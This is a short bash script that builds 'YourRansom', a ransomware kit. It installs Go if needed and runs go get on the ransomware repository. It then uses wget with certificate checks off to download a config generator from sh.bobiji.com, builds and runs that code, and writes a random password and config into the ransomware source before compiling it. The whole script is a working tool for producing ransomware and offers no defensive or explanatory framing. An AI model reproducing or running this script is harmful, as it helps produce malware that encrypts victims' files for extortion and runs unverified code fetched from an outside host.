#!/usr/bin/env bash

msg() {
    echo -e "\033[32m $* \033[0m"
}


go &> /dev/null
if [[ $? -ne 2 ]]; then
    msg "Golang Environment not found, downloading"
    case $(getconf LONG_BIT) in
        32)
        wget https://storage.googleapis.com/golang/go1.8.1.linux-386.tar.gz -o/dev/null --no-check-certificate -O golang.tar.gz
        ;;
        64)
        wget https://storage.googleapis.com/golang/go1.8.1.linux-amd64.tar.gz -o/dev/null --no-check-certificate -O golang.tar.gz
        ;;
    esac
    tar -C /usr/local -xzf golang.tar.gz
    echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc
    echo "export GOPATH=$HOME/go-workspace" >> ~/.bashrc
    mkdir -p $HOME/go-workspace
    . ~/.bashrc
    export PATH=$PATH:/usr/local/go/bin
    export GOPATH=$HOME/go-workspace
fi


msg "Getting source code of YourRansom"
go get "github.com/YourRansom/YourRansom"


msg "Generating config of YourRansom"
rand_str=$(date +%s%N | md5sum | head -c 8)
wget https://sh.bobiji.com/yr1k.go -o/dev/null --no-check-certificate
go build -o config.o yr1k.go
chmod a+x config.o
config=$(./config.o ${rand_str})

cd ${GOPATH}/src/github.com/YourRansom/YourRansom
sed -i "s/YOUR_CONFIG/${config}/" config.go
sed -i "s/YOUR_PW/${rand_str}/" config.go


msg "Building Your Ransom"
go get .
make